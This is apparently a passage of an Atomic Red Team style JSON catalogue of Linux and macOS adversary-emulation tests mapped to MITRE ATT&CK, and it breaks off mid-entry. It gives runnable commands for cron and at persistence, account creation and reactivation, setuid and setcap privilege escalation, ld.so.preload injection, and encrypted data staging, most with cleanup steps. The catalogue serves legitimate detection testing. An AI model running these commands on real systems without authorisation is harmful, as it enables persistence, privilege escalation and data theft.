[
  {
    "attack_technique": "T1497.003",
    "display_name": "Time Based Evasion",
    "source_file": "T1497.003.yaml",
    "test_name": "Delay execution with ping",
    "test_guid": "8b87dd03-8204-478c-bac3-3959f6528de3",
    "description": "Uses the ping command to introduce a delay before executing whoami.\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "ping -c #{ping_count} 8.8.8.8 > /dev/null\n#{evil_command}\n",
      "name": "sh"
    },
    "input_arguments": {
      "evil_command": {
        "description": "Command to run after the delay",
        "type": "string",
        "default": "whoami"
      },
      "ping_count": {
        "description": "Number of ping requests to send (higher counts increase the delay)",
        "type": "integer",
        "default": 250
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Uses the ping command to introduce a delay before executing a malicious payload.\n",
    "indexed_technique": "T1497.003.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion",
      "discovery"
    ]
  },
  {
    "attack_technique": "T1053.002",
    "display_name": "Scheduled Task/Job: At",
    "source_file": "T1053.002.yaml",
    "test_name": "At - Schedule a job",
    "test_guid": "7266d898-ac82-4ec0-97c7-436075d0d08e",
    "description": "This test submits the command (echo Hello) to be run in the future (now + 1 minute) by the `at` daemon.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "echo \"#{at_command}\" | at #{time_spec}"
    },
    "input_arguments": {
      "time_spec": {
        "description": "Time specification of when the command should run",
        "type": "string",
        "default": "now + 1 minute"
      },
      "at_command": {
        "description": "The command to be run",
        "type": "string",
        "default": "echo Hello from Atomic Red Team"
      }
    },
    "dependencies": [
      {
        "description": "The `at` and `atd` executables must exist in the PATH\n",
        "prereq_command": "if [ \"$(uname)\" = 'FreeBSD' ]; then which at; else which at && which atd; fi;\n",
        "get_prereq_command": "echo 'Please install `at` and `atd`; they were not found in the PATH (Package name: `at`)'\n"
      },
      {
        "description": "The `atd` daemon must be running\n",
        "prereq_command": "if [ $(uname) = 'Linux' ]; then systemctl status atd || service atd status; fi;\n",
        "get_prereq_command": "echo 'Please start the `atd` daemon (sysv: `service atd start` ; systemd: `systemctl start atd`)'\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "This test submits a command to be run in the future by the `at` daemon.\n",
    "indexed_technique": "T1053.002.01",
    "technique_index": 1,
    "categories": [
      "privilege-escalation",
      "execution",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1078.003",
    "display_name": "Valid Accounts: Local Accounts",
    "source_file": "T1078.003.yaml",
    "test_name": "Create local account (Linux)",
    "test_guid": "02a91c34-8a5b-4bed-87af-501103eb5357",
    "description": "In this test we create a \"art\" user with the password art, switch to art, execute whoami, exit and delete the art user.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "bash",
      "elevation_required": true,
      "command": "password=$(openssl passwd -1 art)\n([ \"$(uname)\" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0))\nsu art -c \"whoami; exit\"\n",
      "cleanup_command": "[ \"$(uname)\" = 'Linux' ] && userdel art -rf || rmuser -y art\n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "An adversary may wish to create an account with admin privileges to work with. In this test we create a \"art\" user with the password art, switch to art, execute whoami, exit and delete the art user.\n",
    "indexed_technique": "T1078.003.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion",
      "privilege-escalation",
      "persistence",
      "initial-access"
    ]
  },
  {
    "attack_technique": "T1078.003",
    "display_name": "Valid Accounts: Local Accounts",
    "source_file": "T1078.003.yaml",
    "test_name": "Reactivate a locked/expired account (Linux)",
    "test_guid": "d2b95631-62d7-45a3-aaef-0972cea97931",
    "description": "In this test we create a \"art\" user with the password art, lock and expire the account, try to su to art and fail, unlock and renew the account, su successfully, then delete the account.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "bash",
      "elevation_required": true,
      "command": "useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art\nusermod --lock art\nusermod --expiredate \"1\" art\nusermod --unlock art\nusermod --expiredate \"99999\" art\nsu -c whoami art\n",
      "cleanup_command": "userdel -r art \n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "A system administrator may have locked and expired a user account rather than deleting it. \"the user is coming back, at some stage\" An adversary may reactivate a inactive account in an attempt to appear legitimate. \n\nIn this test we create a \"art\" user with the password art, lock and expire the account, try to su to art and fail, unlock and renew the account, su successfully, then delete the account.\n",
    "indexed_technique": "T1078.003.02",
    "technique_index": 2,
    "categories": [
      "defense-evasion",
      "privilege-escalation",
      "persistence",
      "initial-access"
    ]
  },
  {
    "attack_technique": "T1078.003",
    "display_name": "Valid Accounts: Local Accounts",
    "source_file": "T1078.003.yaml",
    "test_name": "Login as nobody (Linux)",
    "test_guid": "3d2cd093-ee05-41bd-a802-59ee5c301b85",
    "description": "In this test change the login shell of the nobody account, change its password to nobody, su to nobody, exit, then reset nobody's shell to /usr/sbin/nologin. Here is how the nobody entry should look like in `/etc/passwd` before the test is executed and right after the cleanup: `# -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin`\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "bash",
      "elevation_required": true,
      "command": "cat /etc/passwd |grep nobody\nchsh --shell /bin/bash nobody\nusermod --password $(openssl passwd -1 nobody) nobody\nsu -c \"whoami\" nobody\n",
      "cleanup_command": "chsh --shell /usr/sbin/nologin nobody\ncat /etc/passwd |grep nobody\n# -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "An adversary may try to re-purpose a system account to appear legitimate. In this test change the login shell of the nobody account, change its password to nobody, su to nobody, exit, then reset nobody's shell to /usr/sbin/nologin. Here is how the nobody entry should look like in `/etc/passwd` before the test is executed and right after the cleanup: `# -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin`\n",
    "indexed_technique": "T1078.003.03",
    "technique_index": 3,
    "categories": [
      "defense-evasion",
      "privilege-escalation",
      "persistence",
      "initial-access"
    ]
  },
  {
    "attack_technique": "T1560.001",
    "display_name": "Archive Collected Data: Archive via Utility",
    "source_file": "T1560.001.yaml",
    "test_name": "Data Compressed - nix - zip",
    "test_guid": "c51cec55-28dd-4ad2-9461-1eacbc82c3a0",
    "description": "Compress files from /var/log/{w,b}tmp into $HOME/data.zip using zip.\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "name": "bash",
      "elevation_required": true,
      "command": "zip #{output_file} #{input_files}\n",
      "cleanup_command": "rm -f #{output_file}\n"
    },
    "input_arguments": {
      "input_files": {
        "description": "Path that should be compressed into our output file, may include wildcards",
        "type": "path",
        "default": "/var/log/{w,b}tmp"
      },
      "output_file": {
        "description": "Path that should be output as a zip archive",
        "type": "path",
        "default": "$HOME/data.zip"
      }
    },
    "dependencies": [
      {
        "description": "Files to zip must exist (#{input_files})\n",
        "prereq_command": "if [ $(ls #{input_files} | wc -l) > 0 ] && [ -x $(which zip) ] ; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "(which yum && yum -y install epel-release zip)||(which apt-get && apt-get install -y zip)\necho Please set input_files argument to include files that exist\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard zip compression.\n",
    "indexed_technique": "T1560.001.01",
    "technique_index": 1,
    "categories": [
      "collection"
    ]
  },
  {
    "attack_technique": "T1560.001",
    "display_name": "Archive Collected Data: Archive via Utility",
    "source_file": "T1560.001.yaml",
    "test_name": "Data Compressed - nix - gzip Single File",
    "test_guid": "cde3c2af-3485-49eb-9c1f-0ed60e9cc0af",
    "description": "Compresses $HOME/data.txt into $HOME/gzip.txt.gz using gzip, creating the file with default content if it does not exist.\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "test -e #{input_file} && gzip -k #{input_file} || (echo '#{input_content}' >> #{input_file}; gzip -k #{input_file})\n",
      "cleanup_command": "rm -f #{input_file}.gz\n"
    },
    "input_arguments": {
      "input_file": {
        "description": "Path that should be compressed",
        "type": "path",
        "default": "$HOME/victim-gzip.txt"
      },
      "input_content": {
        "description": "contents of compressed files if file does not already exist. default contains test credit card and social security number",
        "type": "string",
        "default": "confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.\n",
    "indexed_technique": "T1560.001.02",
    "technique_index": 2,
    "categories": [
      "collection"
    ]
  },
  {
    "attack_technique": "T1560.001",
    "display_name": "Archive Collected Data: Archive via Utility",
    "source_file": "T1560.001.yaml",
    "test_name": "Data Compressed - nix - tar Folder or File",
    "test_guid": "7af2b51e-ad1c-498c-aca8-d3290c19535a",
    "description": "Compresses $HOME/$USERNAME into $HOME/data.tar.gz using tar.\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "tar -cvzf #{output_file} #{input_file_folder}\n",
      "cleanup_command": "rm -f #{output_file}\n"
    },
    "input_arguments": {
      "input_file_folder": {
        "description": "Path that should be compressed",
        "type": "path",
        "default": "$HOME/$USERNAME"
      },
      "output_file": {
        "description": "File that should be output",
        "type": "path",
        "default": "$HOME/data.tar.gz"
      }
    },
    "dependencies": [
      {
        "description": "Folder to zip must exist (#{input_file_folder})\n",
        "prereq_command": "test -e #{input_file_folder}\n",
        "get_prereq_command": "mkdir -p #{input_file_folder} && touch #{input_file_folder}/file1\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.\n",
    "indexed_technique": "T1560.001.03",
    "technique_index": 3,
    "categories": [
      "collection"
    ]
  },
  {
    "attack_technique": "T1560.001",
    "display_name": "Archive Collected Data: Archive via Utility",
    "source_file": "T1560.001.yaml",
    "test_name": "Data Encrypted with zip and gpg symmetric",
    "test_guid": "0286eb44-e7ce-41a0-b109-3da516e05a5f",
    "description": "This test creates files in /tmp/T1560, archives them into a password-protected zip file, and then encrypts that archive with GPG.\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": false,
      "command": "mkdir -p #{test_folder}\ncd #{test_folder}; touch a b c d e f g\nzip --password \"#{encryption_password}\" #{test_folder}/#{test_file} ./*\necho \"#{encryption_password}\" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip\nls -l #{test_folder}\n",
      "cleanup_command": "rm -Rf #{test_folder}\n"
    },
    "input_arguments": {
      "test_folder": {
        "description": "Path used to store files.",
        "type": "path",
        "default": "/tmp/T1560"
      },
      "test_file": {
        "description": "Temp file used to store encrypted data.",
        "type": "path",
        "default": "T1560"
      },
      "encryption_password": {
        "description": "Password used to encrypt data.",
        "type": "string",
        "default": "InsertPasswordHere"
      }
    },
    "dependencies": [
      {
        "description": "gpg and zip are required to run the test.",
        "prereq_command": "if [ ! -x \"$(command -v gpg)\" ] || [ ! -x \"$(command -v zip)\" ]; then exit 1; fi;\n",
        "get_prereq_command": "(which pkg && pkg install -y gnupg zip)||(which yum && yum -y install epel-release zip gpg)||(which apt-get && apt-get install -y zip gpg)\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Encrypt data for exiltration\n",
    "indexed_technique": "T1560.001.04",
    "technique_index": 4,
    "categories": [
      "collection"
    ]
  },
  {
    "attack_technique": "T1560.001",
    "display_name": "Archive Collected Data: Archive via Utility",
    "source_file": "T1560.001.yaml",
    "test_name": "Encrypts collected data with AES-256 and Base64",
    "test_guid": "a743e3a6-e8b2-4a30-abe7-ca85d201b5d3",
    "description": "This test zips /tmp/t1560 into /tmp/t1560/t1560_data.zip, encrypts it with AES-256 using password 'atomic_enc_pass' into /tmp/t1560/t1560_data.enc, and outputs the result in base64.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "zip -r  #{input_folder}/#{input_file}.zip #{input_folder}\nopenssl enc -aes-256-cbc -pass pass:#{enc_pass} -p -in #{input_folder}/#{input_file}.zip -out #{input_folder}/#{input_file}.enc \ncat #{input_folder}/#{input_file}.enc | base64",
      "cleanup_command": "rm -rf #{input_folder}",
      "name": "bash",
      "elevation_required": false
    },
    "input_arguments": {
      "input_folder": {
        "description": "Path to the folder used to store the test files",
        "type": "path",
        "default": "/tmp/t1560"
      },
      "input_file": {
        "description": "Name of the compressed and encrypted files",
        "type": "string",
        "default": "t1560_data"
      },
      "enc_pass": {
        "description": "Password used to encrypt the data",
        "type": "string",
        "default": "atomic_enc_pass"
      }
    },
    "dependencies": [
      {
        "description": "The folder and test files must exist",
        "prereq_command": "if [ ! -d #{input_folder} ]; then exit 1; else exit 0; fi;",
        "get_prereq_command": "if [ ! -d #{input_folder} ]; then mkdir -p #{input_folder}; cd #{input_folder}; touch {a..z}.data; fi;"
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "An adversary may compress all the collected data, encrypt and send them to a C2 server using base64 encoding. \nThis atomic test tries to emulate the behaviour of the FLEXIROOT backdoor to archive the collected data. FLEXIROOT typically utilizes AES encryption and base64 encoding to transfer the encrypted data to the C2 server. \nIn this test, standard zip compression and the OpenSSL library are used to encrypt the compressed data.\nhttps://attack.mitre.org/versions/v7/software/S0267/",
    "indexed_technique": "T1560.001.05",
    "technique_index": 5,
    "categories": [
      "collection"
    ]
  },
  {
    "attack_technique": "T1548.001",
    "display_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
    "source_file": "T1548.001.yaml",
    "test_name": "Make and modify binary from C source",
    "test_guid": "896dfe97-ae43-4101-8e96-9a7996555d80",
    "description": "This test copies PathToAtomicsFolder/T1548.001/src/hello.c to /tmp/hello.c, compiles it into /tmp/hello, sets root ownership, and applies setuid permissions before execution.",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "cp #{payload} /tmp/hello.c\nsudo chown root /tmp/hello.c\nsudo make /tmp/hello\nsudo chown root /tmp/hello\nsudo chmod u+s /tmp/hello\n/tmp/hello\n",
      "cleanup_command": "sudo rm /tmp/hello\nsudo rm /tmp/hello.c\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "payload": {
        "description": "hello.c payload",
        "type": "path",
        "default": "PathToAtomicsFolder/T1548.001/src/hello.c"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Make, change owner, and change file attributes on a C source code file\n",
    "indexed_technique": "T1548.001.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion",
      "privilege-escalation"
    ]
  },
  {
    "attack_technique": "T1548.001",
    "display_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
    "source_file": "T1548.001.yaml",
    "test_name": "Set a SetUID flag on file",
    "test_guid": "759055b3-3885-4582-a8ec-c00c9d64dd79",
    "description": "This test creates /tmp/evilBinary, sets root ownership, and applies the SetUID flag.",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "sudo touch #{file_to_setuid}\nsudo chown root #{file_to_setuid}\nsudo chmod u+xs #{file_to_setuid}\n",
      "cleanup_command": "sudo rm #{file_to_setuid}\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "file_to_setuid": {
        "description": "Path of file to set SetUID flag",
        "type": "path",
        "default": "/tmp/evilBinary"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test sets the SetUID flag on a file in FreeBSD.\n",
    "indexed_technique": "T1548.001.02",
    "technique_index": 2,
    "categories": [
      "defense-evasion",
      "privilege-escalation"
    ]
  },
  {
    "attack_technique": "T1548.001",
    "display_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
    "source_file": "T1548.001.yaml",
    "test_name": "Set a SetGID flag on file",
    "test_guid": "db55f666-7cba-46c6-9fe6-205a05c3242c",
    "description": "This test creates /tmp/evilBinary, sets root ownership, and applies the SetGID flag.",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "sudo touch #{file_to_setuid}\nsudo chown root #{file_to_setuid}\nsudo chmod g+xs #{file_to_setuid}\n",
      "cleanup_command": "sudo rm #{file_to_setuid}\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "file_to_setuid": {
        "description": "Path of file to set SetGID flag",
        "type": "path",
        "default": "/tmp/evilBinary"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test sets the SetGID flag on a file in Linux and macOS.\n",
    "indexed_technique": "T1548.001.03",
    "technique_index": 3,
    "categories": [
      "defense-evasion",
      "privilege-escalation"
    ]
  },
  {
    "attack_technique": "T1548.001",
    "display_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
    "source_file": "T1548.001.yaml",
    "test_name": "Make and modify capabilities of a binary",
    "test_guid": "db53959c-207d-4000-9e7a-cd8eb417e072",
    "description": "This test copies PathToAtomicsFolder/T1548.001/src/cap.c to /tmp/cap.c, compiles it into /tmp/cap, and grants cap_setuid capability to allow setuid(0) without root ownership.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "cp #{payload} /tmp/cap.c\nmake /tmp/cap\nsudo setcap cap_setuid=ep /tmp/cap\n/tmp/cap\n",
      "cleanup_command": "rm /tmp/cap\nrm /tmp/cap.c\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "payload": {
        "description": "cap.c payload",
        "type": "path",
        "default": "PathToAtomicsFolder/T1548.001/src/cap.c"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Make and modify [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) of a C source code file.\nThe binary doesn't have to modify the UID, but the binary is given the capability to arbitrarily modify it at any time with `setuid(0)`.\nWithout being owned by root, the binary can set the UID to 0.\n",
    "indexed_technique": "T1548.001.04",
    "technique_index": 4,
    "categories": [
      "defense-evasion",
      "privilege-escalation"
    ]
  },
  {
    "attack_technique": "T1548.001",
    "display_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
    "source_file": "T1548.001.yaml",
    "test_name": "Provide the SetUID capability to a file",
    "test_guid": "1ac3272f-9bcf-443a-9888-4b1d3de785c1",
    "description": "This test gives the file (/tmp/evilBinary) the capability to set UID without using flags.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "touch #{file_to_setcap}\nsudo setcap cap_setuid=ep #{file_to_setcap}\n",
      "cleanup_command": "rm #{file_to_setcap}\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "file_to_setcap": {
        "description": "Path of file to provide the SetUID capability",
        "type": "path",
        "default": "/tmp/evilBinary"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test gives a file the capability to set UID without using flags.\n",
    "indexed_technique": "T1548.001.05",
    "technique_index": 5,
    "categories": [
      "defense-evasion",
      "privilege-escalation"
    ]
  },
  {
    "attack_technique": "T1548.001",
    "display_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
    "source_file": "T1548.001.yaml",
    "test_name": "Do reconnaissance for files that have the setuid bit set",
    "test_guid": "8e36da01-cd29-45fd-be72-8a0fcaad4481",
    "description": "This test finds all files in /usr/bin that have the setuid permission bit set.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "find /usr/bin -perm -4000\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test simulates a command that can be run to enumerate files that have the setuid bit set\n",
    "indexed_technique": "T1548.001.06",
    "technique_index": 6,
    "categories": [
      "defense-evasion",
      "privilege-escalation"
    ]
  },
  {
    "attack_technique": "T1007",
    "display_name": "System Service Discovery",
    "source_file": "T1007.yaml",
    "test_name": "System Service Discovery - systemctl/service",
    "test_guid": "f4b26bce-4c2c-46c0-bcc5-fce062d38bef",
    "description": "Enumerates system service using systemctl/service\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "if [ \"$(uname)\" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;\n",
      "name": "bash"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Enumerates system service using systemctl/service\n",
    "indexed_technique": "T1007.01",
    "technique_index": 1,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1574.006",
    "display_name": "Hijack Execution Flow: LD_PRELOAD",
    "source_file": "T1574.006.yaml",
    "test_name": "Shared Library Injection via /etc/ld.so.preload",
    "test_guid": "39cb0e67-dd0d-4b74-a74b-c072db7ae991",
    "description": "This test adds /tmp/T1574006.so to /etc/ld.so.preload to execute and intercept API calls.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'\n",
      "cleanup_command": "sudo sed -i 's##{path_to_shared_library}##' /etc/ld.so.preload\n",
      "name": "bash",
      "elevation_required": true
    },
    "input_arguments": {
      "path_to_shared_library_source": {
        "description": "Path to a shared library source code",
        "type": "path",
        "default": "PathToAtomicsFolder/T1574.006/src/Linux/T1574.006.c"
      },
      "path_to_shared_library": {
        "description": "Path to a shared library object",
        "type": "path",
        "default": "/tmp/T1574006.so"
      }
    },
    "dependencies": [
      {
        "description": "The shared library must exist on disk at specified location (#{path_to_shared_library})\n",
        "prereq_command": "if [ -f #{path_to_shared_library} ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}\n"
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.\n\nUpon successful execution, bash will echo `../bin/T1574.006.so` to /etc/ld.so.preload. \n",
    "indexed_technique": "T1574.006.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion",
      "privilege-escalation",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1574.006",
    "display_name": "Hijack Execution Flow: LD_PRELOAD",
    "source_file": "T1574.006.yaml",
    "test_name": "Shared Library Injection via LD_PRELOAD",
    "test_guid": "bc219ff7-789f-4d51-9142-ecae3397deae",
    "description": "This test uses the LD_PRELOAD environment variable to pre-load the shared library at /tmp/T1574006.so for the execution of the `ls` command.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "LD_PRELOAD=#{path_to_shared_library} ls\n",
      "name": "bash"
    },
    "input_arguments": {
      "path_to_shared_library_source": {
        "description": "Path to a shared library source code",
        "type": "path",
        "default": "PathToAtomicsFolder/T1574.006/src/Linux/T1574.006.c"
      },
      "path_to_shared_library": {
        "description": "Path to a shared library object",
        "type": "path",
        "default": "/tmp/T1574006.so"
      }
    },
    "dependencies": [
      {
        "description": "The shared library must exist on disk at specified location (#{path_to_shared_library})\n",
        "prereq_command": "if [ -f #{path_to_shared_library} ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}\n"
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "This test injects a shared object library via the LD_PRELOAD environment variable to execute. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.\n\nUpon successful execution, bash will utilize LD_PRELOAD to load the shared object library `/etc/ld.so.preload`. Output will be via stdout.\n",
    "indexed_technique": "T1574.006.02",
    "technique_index": 2,
    "categories": [
      "defense-evasion",
      "privilege-escalation",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1496",
    "display_name": "Resource Hijacking",
    "source_file": "T1496.yaml",
    "test_name": "FreeBSD/macOS/Linux - Simulate CPU Load with Yes",
    "test_guid": "904a5a0e-fb02-490d-9f8d-0e256eb37549",
    "description": "This test runs 'yes > /dev/null' to simulate high CPU load.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "yes > /dev/null\n",
      "name": "sh"
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test simulates a high CPU load as you might observe during cryptojacking attacks.\nEnd the test by using CTRL/CMD+C to break.\n",
    "indexed_technique": "T1496.01",
    "technique_index": 1,
    "categories": [
      "impact"
    ]
  },
  {
    "attack_technique": "T1087.002",
    "display_name": "Account Discovery: Domain Account",
    "source_file": "T1087.002.yaml",
    "test_name": "Active Directory Domain Search",
    "test_guid": "096b6d2a-b63f-4100-8fa0-525da4cd25ca",
    "description": "This test uses ldapsearch to query user information from Active Directory at ldap://example.test:389 with user@example.test and password s3CurePssw0rD!.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "elevation_required": false,
      "command": "ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b \"CN=Users,DC=#{domain},DC=#{top_level_domain}\" -s sub -a always -z 1000 dn\n",
      "name": "sh"
    },
    "input_arguments": {
      "domain": {
        "description": "The domain to be tested",
        "type": "string",
        "default": "example"
      },
      "top_level_domain": {
        "description": "The top level domain (.com, .test, .remote, etc... following domain, minus the .)",
        "type": "string",
        "default": "test"
      },
      "user": {
        "description": "username@domain of a user within the ad database",
        "type": "string",
        "default": "user@example.test"
      },
      "password": {
        "description": "password of the user with admin privileges referenced in admin_user",
        "type": "string",
        "default": "s3CurePssw0rD!"
      }
    },
    "dependencies": [
      {
        "description": "Packages sssd-ad sssd-tools realmd adcli installed and realm available, ldapsearch\n",
        "prereq_command": "which ldapsearch\n",
        "get_prereq_command": "echo ldapsearch not found\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Output information from LDAPSearch. LDAP Password is the admin-user password on Active Directory\n",
    "indexed_technique": "T1087.002.01",
    "technique_index": 1,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1087.002",
    "display_name": "Account Discovery: Domain Account",
    "source_file": "T1087.002.yaml",
    "test_name": "Account Enumeration with LDAPDomainDump",
    "test_guid": "a54d497e-8dbe-4558-9895-44944baa395f",
    "description": "This test uses LDAPDomainDump to enumerate accounts on a domain at 127.0.0.1 with username domain\\user and password 'password', saving output to /tmp/T1087.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "ldapdomaindump -u #{username} -p #{password} #{target_ip} -o /tmp/T1087",
      "cleanup_command": "rm -rf /tmp/T1087/ 2>/dev/null \n",
      "name": "sh",
      "elevation_required": false
    },
    "input_arguments": {
      "username": {
        "description": "Username and domain to authenticate with",
        "type": "string",
        "default": "domain\\user"
      },
      "target_ip": {
        "description": "IP to connect to",
        "type": "string",
        "default": "127.0.0.1"
      },
      "password": {
        "description": "Password to authenticate with",
        "type": "string",
        "default": "password"
      }
    },
    "dependencies": [
      {
        "description": "Python3 must be installed",
        "prereq_command": "if [ -x \"$(command -v python3 --version)\" ]; then exit 0; else exit 1; fi;",
        "get_prereq_command": "sudo apt-get -y install python3"
      },
      {
        "description": "Pip must be installed",
        "prereq_command": "if [ -x \"$(command -v pip --version)\" ]; then exit 0; else exit 1; fi;",
        "get_prereq_command": "wget -O /tmp/get-pip.py https://bootstrap.pypa.io/pip/3.6/get-pip.py\npython3 /tmp/get-pip.py"
      },
      {
        "description": "The ldapdomaindump module must be installed",
        "prereq_command": "python3 -c 'import ldapdomaindump' 2>/dev/null",
        "get_prereq_command": "pip install ldapdomaindump"
      },
      {
        "description": "The future module must be installed",
        "prereq_command": "python3 -c 'import future' 2>/dev/null",
        "get_prereq_command": "pip install future"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "This test uses LDAPDomainDump to perform account enumeration on a domain.\n[Reference](https://securityonline.info/ldapdomaindump-active-directory-information-dumper-via-ldap/)\n",
    "indexed_technique": "T1087.002.02",
    "technique_index": 2,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1053.003",
    "display_name": "Scheduled Task/Job: Cron",
    "source_file": "T1053.003.yaml",
    "test_name": "Cron - Replace crontab with referenced file",
    "test_guid": "435057fb-74b1-410e-9403-d81baf194f75",
    "description": "This test replaces the user's crontab with a schedule from /tmp/persistevil to run /tmp/evil.sh every minute.\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "name": "sh",
      "command": "crontab -l > /tmp/notevil\necho \"* * * * * #{command}\" > #{tmp_cron} && crontab #{tmp_cron}\n",
      "cleanup_command": "crontab /tmp/notevil\n"
    },
    "input_arguments": {
      "command": {
        "description": "Command to execute",
        "type": "string",
        "default": "/tmp/evil.sh"
      },
      "tmp_cron": {
        "description": "Temporary reference file to hold evil cron schedule",
        "type": "path",
        "default": "/tmp/persistevil"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test replaces the current user's crontab file with the contents of the referenced file. This technique was used by numerous IoT automated exploitation attacks.\n",
    "indexed_technique": "T1053.003.01",
    "technique_index": 1,
    "categories": [
      "privilege-escalation",
      "execution",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1053.003",
    "display_name": "Scheduled Task/Job: Cron",
    "source_file": "T1053.003.yaml",
    "test_name": "Cron - Add script to all cron subfolders",
    "test_guid": "b7d42afa-9086-4c8a-b7b0-8ea3faa6ebb0",
    "description": "This test creates a script named `persistevil` in the /etc/cron.daily, /etc/cron.hourly, /etc/cron.monthly, and /etc/cron.weekly directories.",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "elevation_required": true,
      "name": "bash",
